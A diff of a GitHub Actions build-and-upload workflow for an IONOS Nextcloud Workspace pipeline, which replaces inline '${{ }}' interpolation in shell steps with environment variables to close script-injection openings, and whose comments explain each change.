@@ -110,9 +110,13 @@ jobs:
     steps:
       - name: Compute effective cache version
         id: compute_cache_version
+        # The suffix is free text typed by whoever dispatched the run, so it reaches bash as
+        # data via env rather than being interpolated into the script.
+        env:
+          VERSION_SUFFIX: ${{ github.event.inputs.cache_version_suffix && format('-{0}', github.event.inputs.cache_version_suffix) || '' }}
         run: |
           # Compute cache version with optional suffix to create a single source of truth
-          EFFECTIVE_VERSION="${{ env.CACHE_VERSION }}${{ github.event.inputs.cache_version_suffix && format('-{0}', github.event.inputs.cache_version_suffix) || '' }}"
+          EFFECTIVE_VERSION="${CACHE_VERSION}${VERSION_SUFFIX}"
           echo "effective_cache_version=$EFFECTIVE_VERSION" >> "$GITHUB_OUTPUT"
           echo "Effective cache version: $EFFECTIVE_VERSION"
 
@@ -190,35 +194,47 @@ jobs:
       # trigger job's if:), and a third copy would be a maintenance trap.
       - name: Check configuration
         id: check_config
+        # Context and repository-variable values are bound to environment variables rather
+        # than interpolated into the script: `${{ }}` is expanded textually before bash
+        # parses it, so an interpolated branch name is code. See the 'Trigger remote
+        # workflow' step for the full reasoning.
+        env:
+          REF: ${{ github.ref_name }}
+          EVENT_NAME: ${{ github.event_name }}
+          REPO: ${{ github.repository }}
+          DISABLE_REMOTE_TRIGGER: ${{ vars.DISABLE_REMOTE_TRIGGER }}
+          ENABLE_REMOTE_TRIGGER_USER_DEV: ${{ vars.ENABLE_REMOTE_TRIGGER_USER_DEV }}
+          REMOTE_TRIGGER_NC_VERSION: ${{ vars.REMOTE_TRIGGER_NC_VERSION }}
+          REMOTE_TRIGGER_RC_BRANCH: ${{ vars.REMOTE_TRIGGER_RC_BRANCH }}
         run: |
           echo ""
           echo "### 🔧 Remote Trigger Configuration" >> $GITHUB_STEP_SUMMARY
           echo "" >> $GITHUB_STEP_SUMMARY
-          echo "**DISABLE_REMOTE_TRIGGER value:** \`${{ vars.DISABLE_REMOTE_TRIGGER }}\`" >> $GITHUB_STEP_SUMMARY
-          echo "**ENABLE_REMOTE_TRIGGER_USER_DEV value:** \`${{ vars.ENABLE_REMOTE_TRIGGER_USER_DEV }}\`" >> $GITHUB_STEP_SUMMARY
-          if [ "${{ vars.ENABLE_REMOTE_TRIGGER_USER_DEV }}" != "true" ]; then
-            echo "  - 💡 To enable the GitLab trigger for \`*/dev/*\` branches, set repository variable \`ENABLE_REMOTE_TRIGGER_USER_DEV\` to \`true\` at [Settings → Variables → Actions](https://github.com/${{ github.repository }}/settings/variables/actions)." >> $GITHUB_STEP_SUMMARY
+          echo "**DISABLE_REMOTE_TRIGGER value:** \`${DISABLE_REMOTE_TRIGGER}\`" >> $GITHUB_STEP_SUMMARY
+          echo "**ENABLE_REMOTE_TRIGGER_USER_DEV value:** \`${ENABLE_REMOTE_TRIGGER_USER_DEV}\`" >> $GITHUB_STEP_SUMMARY
+          if [ "$ENABLE_REMOTE_TRIGGER_USER_DEV" != "true" ]; then
+            echo "  - 💡 To enable the GitLab trigger for \`*/dev/*\` branches, set repository variable \`ENABLE_REMOTE_TRIGGER_USER_DEV\` to \`true\` at [Settings → Variables → Actions](https://github.com/${REPO}/settings/variables/actions)." >> $GITHUB_STEP_SUMMARY
           fi
-          echo "**REMOTE_TRIGGER_NC_VERSION:** \`${{ vars.REMOTE_TRIGGER_NC_VERSION }}\`" >> $GITHUB_STEP_SUMMARY
-          echo "**REMOTE_TRIGGER_RC_BRANCH:** \`${{ vars.REMOTE_TRIGGER_RC_BRANCH }}\`" >> $GITHUB_STEP_SUMMARY
-          echo "**Event type:** \`${{ github.event_name }}\`" >> $GITHUB_STEP_SUMMARY
-          echo "**Branch:** \`${{ github.ref_name }}\`" >> $GITHUB_STEP_SUMMARY
+          echo "**REMOTE_TRIGGER_NC_VERSION:** \`${REMOTE_TRIGGER_NC_VERSION}\`" >> $GITHUB_STEP_SUMMARY
+          echo "**REMOTE_TRIGGER_RC_BRANCH:** \`${REMOTE_TRIGGER_RC_BRANCH}\`" >> $GITHUB_STEP_SUMMARY
+          echo "**Event type:** \`${EVENT_NAME}\`" >> $GITHUB_STEP_SUMMARY
+          echo "**Branch:** \`${REF}\`" >> $GITHUB_STEP_SUMMARY
           echo "" >> $GITHUB_STEP_SUMMARY
 
           echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
           echo "🔧 Remote Trigger Configuration"
           echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-          echo "DISABLE_REMOTE_TRIGGER    = '${{ vars.DISABLE_REMOTE_TRIGGER }}'"
-          echo "ENABLE_REMOTE_TRIGGER_USER_DEV = '${{ vars.ENABLE_REMOTE_TRIGGER_USER_DEV }}'"
-          if [ "${{ vars.ENABLE_REMOTE_TRIGGER_USER_DEV }}" != "true" ]; then
+          echo "DISABLE_REMOTE_TRIGGER    = '${DISABLE_REMOTE_TRIGGER}'"
+          echo "ENABLE_REMOTE_TRIGGER_USER_DEV = '${ENABLE_REMOTE_TRIGGER_USER_DEV}'"
+          if [ "$ENABLE_REMOTE_TRIGGER_USER_DEV" != "true" ]; then
             echo "  💡 To enable the GitLab trigger for '*/dev/*' branches,"
             echo "     set repository variable ENABLE_REMOTE_TRIGGER_USER_DEV to 'true' at:"
-            echo "     https://github.com/${{ github.repository }}/settings/variables/actions"
+            echo "     https://github.com/${REPO}/settings/variables/actions"
           fi
-          echo "REMOTE_TRIGGER_NC_VERSION = '${{ vars.REMOTE_TRIGGER_NC_VERSION }}'"
-          echo "REMOTE_TRIGGER_RC_BRANCH  = '${{ vars.REMOTE_TRIGGER_RC_BRANCH }}'"
-          echo "Event type                = '${{ github.event_name }}'"
-          echo "Branch                    = '${{ github.ref_name }}'"
+          echo "REMOTE_TRIGGER_NC_VERSION = '${REMOTE_TRIGGER_NC_VERSION}'"
+          echo "REMOTE_TRIGGER_RC_BRANCH  = '${REMOTE_TRIGGER_RC_BRANCH}'"
+          echo "Event type                = '${EVENT_NAME}'"
+          echo "Branch                    = '${REF}'"
           echo ""
 
           # TRIGGER_REASON names the gate that blocked, and is published below for
@@ -235,7 +251,7 @@ jobs:
             return 0
           }
 
-          if [ "${{ vars.DISABLE_REMOTE_TRIGGER }}" == "true" ]; then
+          if [ "$DISABLE_REMOTE_TRIGGER" == "true" ]; then
             set_reason "DISABLE_REMOTE_TRIGGER='true' — remote trigger force-disabled repo-wide"
             echo "⚠️  Remote trigger is DISABLED"
             echo "    The 'trigger-remote-dev-workflow' job will be SKIPPED"
@@ -244,7 +260,7 @@ jobs:
             echo "The \`trigger-remote-dev-workflow\` job will be skipped." >> $GITHUB_STEP_SUMMARY
             echo "" >> $GITHUB_STEP_SUMMARY
             echo "To enable, delete the variable or set it to a value other than 'true' at:" >> $GITHUB_STEP_SUMMARY
-            echo "https://github.com/${{ github.repository }}/settings/variables/actions" >> $GITHUB_STEP_SUMMARY
+            echo "https://github.com/${REPO}/settings/variables/actions" >> $GITHUB_STEP_SUMMARY
           else
             echo "✅ Remote trigger is ENABLED"
             echo "   Checking if trigger conditions are met..."
@@ -256,10 +272,10 @@ jobs:
             echo "**Trigger Conditions Check:**" >> $GITHUB_STEP_SUMMARY
             echo "" >> $GITHUB_STEP_SUMMARY
 
-            if [ "${{ github.event_name }}" != "push" ]; then
-              echo "- ❌ Event must be 'push' (current: \`${{ github.event_name }}\`)" >> $GITHUB_STEP_SUMMARY
-              echo "   ❌ Event type is '${{ github.event_name }}' (must be 'push')"
-              set_reason "event is '${{ github.event_name }}', the trigger only runs on 'push'"
+            if [ "$EVENT_NAME" != "push" ]; then
+              echo "- ❌ Event must be 'push' (current: \`${EVENT_NAME}\`)" >> $GITHUB_STEP_SUMMARY
+              echo "   ❌ Event type is '${EVENT_NAME}' (must be 'push')"
+              set_reason "event is '${EVENT_NAME}', the trigger only runs on 'push'"
               WILL_TRIGGER=false
             else
               echo "- ✅ Event is 'push'" >> $GITHUB_STEP_SUMMARY
@@ -270,31 +286,33 @@ jobs:
             VALID_BRANCH_PATTERN='^(ionos-dev|ionos-stable)(-v[0-9]+)?$|^rc/.*$|^[^/]+/dev/.*$'
             VALID_BRANCH_DESC="'ionos-dev[-v<major>]', 'ionos-stable[-v<major>]', 'rc/*' or '*/dev/*'"
             USER_DEV_PATTERN='^[^/]+/dev/.*$'
-            if [[ ! "${{ github.ref_name }}" =~ $VALID_BRANCH_PATTERN ]]; then
-              echo "- ❌ Branch must be ${VALID_BRANCH_DESC} (current: \`${{ github.ref_name }}\`)" >> $GITHUB_STEP_SUMMARY
-              echo "   ❌ Branch is '${{ github.ref_name }}' (must be ${VALID_BRANCH_DESC})"
-              set_reason "branch '${{ github.ref_name }}' is not a build lane (expected ${VALID_BRANCH_DESC})"
+            # $VALID_BRANCH_PATTERN and $USER_DEV_PATTERN below stay unquoted on the right of
+            # =~ : quoting a regex operand makes it a literal string match.
+            if [[ ! "$REF" =~ $VALID_BRANCH_PATTERN ]]; then
+              echo "- ❌ Branch must be ${VALID_BRANCH_DESC} (current: \`${REF}\`)" >> $GITHUB_STEP_SUMMARY
+              echo "   ❌ Branch is '${REF}' (must be ${VALID_BRANCH_DESC})"
+              set_reason "branch '${REF}' is not a build lane (expected ${VALID_BRANCH_DESC})"
               WILL_TRIGGER=false
             else
-              echo "- ✅ Branch is '\`${{ github.ref_name }}\`'" >> $GITHUB_STEP_SUMMARY
-              echo "   ✅ Branch is '${{ github.ref_name }}'"
+              echo "- ✅ Branch is '\`${REF}\`'" >> $GITHUB_STEP_SUMMARY
+              echo "   ✅ Branch is '${REF}'"
             fi
 
             # This block is the shell twin of the version gate in the
             # 'trigger-remote-dev-workflow' if: condition. The two are one rule written
             # twice — an edit to either must be mirrored in the other, or this summary
             # reports an outcome the pipeline does not produce.
-            if [[ "${{ github.ref_name }}" =~ $USER_DEV_PATTERN ]]; then
+            if [[ "$REF" =~ $USER_DEV_PATTERN ]]; then
               # Not version-gated; governed solely by the ENABLE_REMOTE_TRIGGER_USER_DEV opt-in.
-              if [ "${{ vars.ENABLE_REMOTE_TRIGGER_USER_DEV }}" == "true" ]; then
+              if [ "$ENABLE_REMOTE_TRIGGER_USER_DEV" == "true" ]; then
                 echo "- ✅ User-dev branch opt-in (\`ENABLE_REMOTE_TRIGGER_USER_DEV='true'\`)" >> $GITHUB_STEP_SUMMARY
                 echo "   ✅ ENABLE_REMOTE_TRIGGER_USER_DEV='true' — '*/dev/*' trigger is opted in"
               else
-                echo "- ❌ User-dev branch requires \`ENABLE_REMOTE_TRIGGER_USER_DEV='true'\` (current: \`${{ vars.ENABLE_REMOTE_TRIGGER_USER_DEV }}\`)" >> $GITHUB_STEP_SUMMARY
+                echo "- ❌ User-dev branch requires \`ENABLE_REMOTE_TRIGGER_USER_DEV='true'\` (current: \`${ENABLE_REMOTE_TRIGGER_USER_DEV}\`)" >> $GITHUB_STEP_SUMMARY
                 echo "- ℹ️  Build & image push will still run — only QA deployment is skipped" >> $GITHUB_STEP_SUMMARY
-                echo "   ❌ '*/dev/*' branch requires ENABLE_REMOTE_TRIGGER_USER_DEV='true' (current: '${{ vars.ENABLE_REMOTE_TRIGGER_USER_DEV }}')"
+                echo "   ❌ '*/dev/*' branch requires ENABLE_REMOTE_TRIGGER_USER_DEV='true' (current: '${ENABLE_REMOTE_TRIGGER_USER_DEV}')"
                 echo "   ℹ️  Build & image push will still run — only QA deployment is skipped"
-                set_reason "'*/dev/*' branch needs ENABLE_REMOTE_TRIGGER_USER_DEV='true' (currently '${{ vars.ENABLE_REMOTE_TRIGGER_USER_DEV }}')"
+                set_reason "'*/dev/*' branch needs ENABLE_REMOTE_TRIGGER_USER_DEV='true' (currently '${ENABLE_REMOTE_TRIGGER_USER_DEV}')"
                 WILL_TRIGGER=false
               fi
             else
@@ -302,9 +320,9 @@ jobs:
               # must end with REMOTE_TRIGGER_NC_VERSION; all other branches reaching here (rc/*)
               # must match REMOTE_TRIGGER_RC_BRANCH exactly — the suffix check must NOT apply to
               # rc/* or an RC branch could pass by coincidence of name.
-              NC_VERSION="${{ vars.REMOTE_TRIGGER_NC_VERSION }}"
-              RC_BRANCH="${{ vars.REMOTE_TRIGGER_RC_BRANCH }}"
-              BRANCH="${{ github.ref_name }}"
+              NC_VERSION="$REMOTE_TRIGGER_NC_VERSION"
+              RC_BRANCH="$REMOTE_TRIGGER_RC_BRANCH"
+              BRANCH="$REF"
 
               if [ "$BRANCH" == "ionos-dev" ] || [ "$BRANCH" == "ionos-stable" ]; then
                 echo "- ✅ Version gate: '$BRANCH' is always exempt" >> $GITHUB_STEP_SUMMARY
@@ -394,14 +412,20 @@ jobs:
           JF_ACCESS_TOKEN: ${{ secrets.JF_ACCESS_TOKEN }}
           ARTIFACTORY_REPOSITORY_SNAPSHOT: ${{ env.ARTIFACTORY_REPOSITORY_SNAPSHOT }}
           GITHUB_REF: ${{ github.ref }}
+          # Display-only copies of the two workflow_dispatch inputs. They differ from
+          # APPS_TO_REBUILD above only in their empty-value placeholder, and both are free
+          # text typed by whoever dispatched the run.
+          CACHE_VERSION_SUFFIX_DISPLAY: ${{ github.event.inputs.cache_version_suffix || '(none)' }}
+          APPS_TO_REBUILD_DISPLAY: ${{ github.event.inputs.apps_to_rebuild || '(none)' }}
+          MATRIX_JSON: ${{ steps.set_matrix.outputs.matrix }}
         run: |
           # Show effective cache version
-          echo "Base CACHE_VERSION: ${{ env.CACHE_VERSION }}"
-          echo "Cache version suffix: ${{ github.event.inputs.cache_version_suffix || '(none)' }}"
+          echo "Base CACHE_VERSION: ${CACHE_VERSION}"
+          echo "Cache version suffix: ${CACHE_VERSION_SUFFIX_DISPLAY}"
           echo "Effective CACHE_VERSION: ${CACHE_VERSION}"
-          echo "Apps to rebuild: ${{ github.event.inputs.apps_to_rebuild || '(none)' }}"
+          echo "Apps to rebuild: ${APPS_TO_REBUILD_DISPLAY}"
           echo ""
-          bash .github/scripts/detect-app-cache.sh '${{ steps.set_matrix.outputs.matrix }}'
+          bash .github/scripts/detect-app-cache.sh "$MATRIX_JSON"
 
   build-external-apps:
     runs-on: ubuntu-latest
@@ -422,11 +446,14 @@ jobs:
     steps:
       - name: Get app configuration from full matrix
         id: app-config
+        # FULL_MATRIX and APP_NAME come from the Makefile-generated app matrix, i.e. from
+        # repo files a PR author can edit. Interpolated into single quotes as they were, one
+        # apostrophe in an app name breaks out of the string.
+        env:
+          FULL_MATRIX: ${{ needs.prepare-matrix.outputs.external_apps_matrix }}
+          APP_NAME: ${{ matrix.app_info.name }}
+          APP_SHA: ${{ matrix.app_info.sha }}
         run: |
-          # Get the full matrix to look up app configuration
-          FULL_MATRIX='${{ needs.prepare-matrix.outputs.external_apps_matrix }}'
-          APP_NAME='${{ matrix.app_info.name }}'
-
           # Find the app configuration in the full matrix
           APP_CONFIG=$(echo "$FULL_MATRIX" | jq -c --arg name "$APP_NAME" '.[] | select(.name == $name)')
 
@@ -446,7 +473,7 @@ jobs:
           echo "has-npm=$HAS_NPM" >> $GITHUB_OUTPUT
           echo "has-composer=$HAS_COMPOSER" >> $GITHUB_OUTPUT
           echo "makefile-target=$MAKEFILE_TARGET" >> $GITHUB_OUTPUT
-          echo "Building $APP_NAME from $APP_PATH (SHA: ${{ matrix.app_info.sha }})"
+          echo "Building $APP_NAME from $APP_PATH (SHA: ${APP_SHA})"
 
       - name: Checkout server
         uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # 7.0.0
@@ -482,14 +509,23 @@ jobs:
             ${{ runner.os }}-composer-${{ matrix.app_info.name }}-
 
       - name: Build ${{ matrix.app_info.name }} app
-        run: make -f IONOS/Makefile ${{ steps.app-config.outputs.makefile-target }}
+        # The target name came straight off the matrix into the command line, unquoted and
+        # with no env: at all. Quoting is right here: a make target is a single word, so
+        # suppressing word-splitting is the intended behaviour.
+        env:
+          MAKEFILE_TARGET: ${{ steps.app-config.outputs.makefile-target }}
+        run: make -f IONOS/Makefile "$MAKEFILE_TARGET"
 
       - name: Report build completion
         if: success()
+        env:
+          APP_NAME: ${{ matrix.app_info.name }}
+          APP_SHA: ${{ matrix.app_info.sha }}
+          APP_PATH: ${{ steps.app-config.outputs.path }}
         run: |
-          echo "### ✅ Built ${{ matrix.app_info.name }}" >> $GITHUB_STEP_SUMMARY
-          echo "- **SHA:** \`${{ matrix.app_info.sha }}\`" >> $GITHUB_STEP_SUMMARY
-          echo "- **Path:** ${{ steps.app-config.outputs.path }}" >> $GITHUB_STEP_SUMMARY
+          echo "### ✅ Built ${APP_NAME}" >> $GITHUB_STEP_SUMMARY
+          echo "- **SHA:** \`${APP_SHA}\`" >> $GITHUB_STEP_SUMMARY
+          echo "- **Path:** ${APP_PATH}" >> $GITHUB_STEP_SUMMARY
           echo "- **Status:** Success" >> $GITHUB_STEP_SUMMARY
           echo "" >> $GITHUB_STEP_SUMMARY
 
@@ -524,14 +560,16 @@ jobs:
           run-id: ${{ github.run_id }}
 
       - name: Push ${{ matrix.app_info.name }} to JFrog
+        env:
+          APP_NAME: ${{ matrix.app_info.name }}
+          APP_SHA: ${{ matrix.app_info.sha }}
+          APP_PATH: ${{ steps.app-config.outputs.path }}
+          EFFECTIVE_CACHE_VERSION: ${{ needs.prepare-matrix.outputs.effective_cache_version }}
+          REF: ${{ github.ref_name }}
+          SHA: ${{ github.sha }}
+          JOB_HTML_URL: ${{ steps.get_job_data.outputs.job_html_url }}
         run: |
           set -e
-          APP_NAME="${{ matrix.app_info.name }}"
-          APP_SHA="${{ matrix.app_info.sha }}"
-          APP_PATH="${{ steps.app-config.outputs.path }}"
-
-          # Use precomputed effective cache version
-          EFFECTIVE_CACHE_VERSION="${{ needs.prepare-matrix.outputs.effective_cache_version }}"
 
           echo "=== JFrog Upload Debug Info ==="
           echo "📦 Packaging $APP_NAME for JFrog upload..."
@@ -539,7 +577,7 @@ jobs:
           echo "App SHA: $APP_SHA"
           echo "App Path: $APP_PATH"
           echo "Cache Version: $EFFECTIVE_CACHE_VERSION"
-          echo "Repository: ${{ env.ARTIFACTORY_REPOSITORY_SNAPSHOT }}"
+          echo "Repository: ${ARTIFACTORY_REPOSITORY_SNAPSHOT}"
           echo "==============================="
 
           # Verify app path exists
@@ -570,17 +608,17 @@ jobs:
 
           # Upload to JFrog - store in snapshot repo under dev/apps/
           # Include CACHE_VERSION in path to enable complete cache invalidation
-          JFROG_PATH="${{ env.ARTIFACTORY_REPOSITORY_SNAPSHOT }}/apps/${EFFECTIVE_CACHE_VERSION}/${APP_NAME}/${ARCHIVE_NAME}"
+          JFROG_PATH="${ARTIFACTORY_REPOSITORY_SNAPSHOT}/apps/${EFFECTIVE_CACHE_VERSION}/${APP_NAME}/${ARCHIVE_NAME}"
 
           # Build properties for artifact metadata
           JFROG_PROPS_LIST=()
           JFROG_PROPS_LIST+=("app.name=${APP_NAME}")
           JFROG_PROPS_LIST+=("app.sha=${APP_SHA}")
-          JFROG_PROPS_LIST+=("vcs.branch=${{ github.ref_name }}")
-          JFROG_PROPS_LIST+=("vcs.revision=${{ github.sha }}")
+          JFROG_PROPS_LIST+=("vcs.branch=${REF}")
+          JFROG_PROPS_LIST+=("vcs.revision=${SHA}")
 
           # Add job URL if available
-          JOB_URL="${{ steps.get_job_data.outputs.job_html_url }}"
+          JOB_URL="$JOB_HTML_URL"
           if [ -n "$JOB_URL" ]; then
             JFROG_PROPS_LIST+=("job.html_url=${JOB_URL}")
           fi
@@ -662,13 +700,25 @@ jobs:
           jf rt ping
 
       - name: Restore all apps from cache and JFrog
+        # The matrix JSON blobs were interpolated into single-quoted assignments, where one
+        # apostrophe in an app name breaks out of the string. They are generated from repo
+        # files a PR author can edit.
+        env:
+          # GH_TOKEN was declared in a second env: block after the run: below. Merged here:
+          # two env: keys on one step is a YAML duplicate key, and the later one wins.
+          GH_TOKEN: ${{ github.token }}
+          HAS_APPS_TO_RESTORE: ${{ needs.prepare-matrix.outputs.has_apps_to_restore }}
+          HAS_APPS_TO_BUILD: ${{ needs.prepare-matrix.outputs.has_apps_to_build }}
+          APPS_TO_RESTORE: ${{ needs.prepare-matrix.outputs.apps_to_restore }}
+          APPS_TO_BUILD: ${{ needs.prepare-matrix.outputs.apps_to_build }}
+          FULL_MATRIX: ${{ needs.prepare-matrix.outputs.external_apps_matrix }}
+          EFFECTIVE_CACHE_VERSION: ${{ needs.prepare-matrix.outputs.effective_cache_version }}
         run: |
           set -euo pipefail
 
           # Restore apps that are in cache (from apps_to_restore)
-          if [ "${{ needs.prepare-matrix.outputs.has_apps_to_restore }}" == "true" ]; then
+          if [ "$HAS_APPS_TO_RESTORE" == "true" ]; then
             echo "📦 Restoring cached apps..."
-            APPS_TO_RESTORE='${{ needs.prepare-matrix.outputs.apps_to_restore }}'
 
             # Process each app in the restore list
             echo "$APPS_TO_RESTORE" | jq -c '.[]' | while read -r app_json; do
@@ -739,12 +789,9 @@ jobs:
           fi
 
           # Also restore newly built apps from JFrog (from apps_to_build)
-          if [ "${{ needs.prepare-matrix.outputs.has_apps_to_build }}" == "true" ]; then
+          if [ "$HAS_APPS_TO_BUILD" == "true" ]; then
             echo ""
             echo "📦 Restoring newly built apps from JFrog..."
-            APPS_TO_BUILD='${{ needs.prepare-matrix.outputs.apps_to_build }}'
-            FULL_MATRIX='${{ needs.prepare-matrix.outputs.external_apps_matrix }}'
-            EFFECTIVE_CACHE_VERSION="${{ needs.prepare-matrix.outputs.effective_cache_version }}"
 
             # Process each app in the build list
             echo "$APPS_TO_BUILD" | jq -c '.[]' | while read -r app_json; do
@@ -765,7 +812,7 @@ jobs:
               echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
 
               # Construct JFrog path matching what build-external-apps uploaded
-              JFROG_PATH="${{ env.ARTIFACTORY_REPOSITORY_SNAPSHOT }}/apps/${EFFECTIVE_CACHE_VERSION}/${APP_NAME}/${APP_NAME}-${APP_SHA}.tar.gz"
+              JFROG_PATH="${ARTIFACTORY_REPOSITORY_SNAPSHOT}/apps/${EFFECTIVE_CACHE_VERSION}/${APP_NAME}/${APP_NAME}-${APP_SHA}.tar.gz"
               ARCHIVE_NAME="${APP_NAME}-${APP_SHA}.tar.gz"
 
               echo "📥 Downloading from JFrog: $JFROG_PATH"
@@ -798,8 +845,6 @@ jobs:
           echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
           echo "✅ All apps restored successfully"
           echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-        env:
-          GH_TOKEN: ${{ github.token }}
 
       - name: Set up node with version from package.json's engines
         uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e # 6.4.0
@@ -843,14 +888,16 @@ jobs:
       # IONOS Customization: Inject build number for production traceability
       # This is specific to IONOS Nextcloud Workspace and not part of upstream Nextcloud
       - name: Inject build number
+        env:
+          RUN_NUMBER: ${{ github.run_number }}
         run: |
-          echo "${{ github.run_number }}" > .buildnumber
-          echo "✅ Build number injected: ${{ github.run_number }}"
+          echo "$RUN_NUMBER" > .buildnumber
+          echo "✅ Build number injected: ${RUN_NUMBER}"
           echo "📄 File created: .buildnumber"
           cat .buildnumber
 
       - name: Zip dependencies
-        run: make -f IONOS/Makefile zip_dependencies TARGET_PACKAGE_NAME=${{ env.TARGET_PACKAGE_NAME }}
+        run: make -f IONOS/Makefile zip_dependencies TARGET_PACKAGE_NAME="$TARGET_PACKAGE_NAME"
 
       - name: Get NC version
         id: get_nc_version
@@ -908,23 +955,27 @@ jobs:
           fetch-depth: 1
 
       - name: Check prerequisites
+        env:
+          JF_URL: ${{ secrets.JF_ARTIFACTORY_URL }}
+          JF_USER: ${{ secrets.JF_ARTIFACTORY_USER }}
+          JF_ACCESS_TOKEN: ${{ secrets.JF_ACCESS_TOKEN }}
         run: |
           # count the number of secrets that are set
           echo "Checking if required secrets are set..."
           error_count=0
 
-          if [ -z "${{ secrets.JF_ARTIFACTORY_URL }}" ]; then
+          if [ -z "$JF_URL" ]; then
             # output error to github actions log
             echo "::error::JF_ARTIFACTORY_URL secret is not set"
             error_count=$((error_count + 1))
           fi
 
-          if [ -z "${{ secrets.JF_ARTIFACTORY_USER }}" ]; then
+          if [ -z "$JF_USER" ]; then
             echo "::error::JF_ARTIFACTORY_USER secret is not set"
             error_count=$((error_count + 1))
           fi
 
-          if [ -z "${{ secrets.JF_ACCESS_TOKEN }}" ]; then
+          if [ -z "$JF_ACCESS_TOKEN" ]; then
             echo "::error::JF_ACCESS_TOKEN secret is not set"
             error_count=$((error_count + 1))
           fi
@@ -964,6 +1015,16 @@ jobs:
 
       - name: Upload build to artifactory
         id: artifactory_upload
+        # Context values are bound to environment variables rather than interpolated into
+        # the script — `${{ }}` expands textually before bash parses it, so an interpolated
+        # branch name is code. This job holds the JFrog credentials.
+        env:
+          REF: ${{ github.ref_name }}
+          SHA: ${{ github.sha }}
+          RUN_NUMBER: ${{ github.run_number }}
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+          NC_VERSION_FULL: ${{ needs.build-artifact.outputs.NC_VERSION }}
+          JOB_HTML_URL: ${{ steps.get_job_data.outputs.job_html_url }}
         run: |
           # Artifactory Build Storage Structure:
           # | Branch/Event     | Stage Prefix   | Artifact Path                                                                              |
@@ -982,30 +1043,32 @@ jobs:
 
           ARTIFACTORY_STAGE_PREFIX="dev"
 
-          # Set stage prefix based on branch
-          if [[ "${{ github.ref_name }}" == "ionos-stable" || "${{ github.ref_name }}" == ionos-stable-v[0-9]* ]]; then
+          # Set stage prefix based on branch. The ionos-stable-v[0-9]* glob stays unquoted on
+          # the right of [[ ]]: quoting it would make this a literal comparison and a
+          # suffixed stable lane would silently publish into dev/.
+          if [[ "$REF" == "ionos-stable" || "$REF" == ionos-stable-v[0-9]* ]]; then
               ARTIFACTORY_STAGE_PREFIX="stable"
           # set ARTIFACTORY_STAGE_PREFIX=rc on rc/* branches
-          elif [[ "${{ github.ref_name }}" =~ ^rc/.*$ ]]; then
-              ARTIFACTORY_STAGE_PREFIX="${{ github.ref_name }}"
+          elif [[ "$REF" =~ ^rc/.*$ ]]; then
+              ARTIFACTORY_STAGE_PREFIX="$REF"
           # Extract prefix from */dev/* branches (e.g., 'ah/dev/feature' -> 'dev-ah')
-          elif [[ "${{ github.ref_name }}" =~ ^.*/dev/.*$ ]]; then
+          elif [[ "$REF" =~ ^.*/dev/.*$ ]]; then
               # Extract the part before '/dev/'
-              BRANCH_PREFIX=$(echo "${{ github.ref_name }}" | sed 's|/.*||' | sed 's/[^A-Za-z0-9._-]/-/g')
+              BRANCH_PREFIX=$(printf '%s' "$REF" | sed 's|/.*||' | sed 's/[^A-Za-z0-9._-]/-/g')
               ARTIFACTORY_STAGE_PREFIX="dev-${BRANCH_PREFIX}"
           fi
 
-          export PATH_TO_DIRECTORY="${{ env.ARTIFACTORY_REPOSITORY_SNAPSHOT }}/${ARTIFACTORY_STAGE_PREFIX}"
+          export PATH_TO_DIRECTORY="${ARTIFACTORY_REPOSITORY_SNAPSHOT}/${ARTIFACTORY_STAGE_PREFIX}"
 
           # For PR: use simple pr/<number> path
           # For branches: use ncw-<version>/<sha>/ structure to ensure unique paths
-          if [ -n "${{ github.event.pull_request.number }}" ]; then
-            PATH_TO_FILE="pr/nextcloud-workspace-pr-${{ github.event.pull_request.number }}.zip"
+          if [ -n "$PR_NUMBER" ]; then
+            PATH_TO_FILE="pr/nextcloud-workspace-pr-${PR_NUMBER}.zip"
           else
             # Extract short SHA (first 7 characters)
-            SHORT_SHA="${{ github.sha }}"
+            SHORT_SHA="$SHA"
             SHORT_SHA="${SHORT_SHA:0:7}"
-            NC_VERSION="${{ needs.build-artifact.outputs.NC_VERSION }}"
+            NC_VERSION="$NC_VERSION_FULL"
 
             PATH_TO_FILE="ncw-${NC_VERSION}/${SHORT_SHA}/nextcloud-workspace-${NC_VERSION}.zip"
           fi
@@ -1014,12 +1077,12 @@ jobs:
 
           # Build properties for artifact metadata
           JFROG_PROPS_LIST=()
-          JFROG_PROPS_LIST+=("build.nc_version=${{ needs.build-artifact.outputs.NC_VERSION }}")
-          JFROG_PROPS_LIST+=("vcs.branch=${{ github.ref_name }}")
-          JFROG_PROPS_LIST+=("vcs.revision=${{ github.sha }}")
+          JFROG_PROPS_LIST+=("build.nc_version=${NC_VERSION_FULL}")
+          JFROG_PROPS_LIST+=("vcs.branch=${REF}")
+          JFROG_PROPS_LIST+=("vcs.revision=${SHA}")
 
           # Add job URL if available
-          JOB_URL="${{ steps.get_job_data.outputs.job_html_url }}"
+          JOB_URL="$JOB_HTML_URL"
           if [ -n "$JOB_URL" ]; then
             JFROG_PROPS_LIST+=("job.html_url=${JOB_URL}")
           fi
@@ -1038,9 +1101,9 @@ jobs:
           while [ $ATTEMPT -le $MAX_ATTEMPTS ]; do
             echo "Upload attempt $ATTEMPT of $MAX_ATTEMPTS..."
 
-            if jf rt upload "${{ env.TARGET_PACKAGE_NAME }}" \
-              --build-name "${{ env.BUILD_NAME }}" \
-              --build-number ${{ github.run_number }} \
+            if jf rt upload "${TARGET_PACKAGE_NAME}" \
+              --build-name "${BUILD_NAME}" \
+              --build-number "${RUN_NUMBER}" \
               --target-props "$JFROG_PROPS" \
               $PATH_TO_LATEST_ARTIFACT; then
               UPLOAD_SUCCESS=true
@@ -1111,9 +1174,9 @@ jobs:
         run: |
           cat >Dockerfile << EOF
           FROM busybox as builder
-          COPY ./${{ env.TARGET_PACKAGE_NAME }} /
+          COPY ./${TARGET_PACKAGE_NAME} /
           WORKDIR /builder
-          RUN unzip /${{ env.TARGET_PACKAGE_NAME }} -d /builder
+          RUN unzip /${TARGET_PACKAGE_NAME} -d /builder
 
           FROM scratch
           WORKDIR /app
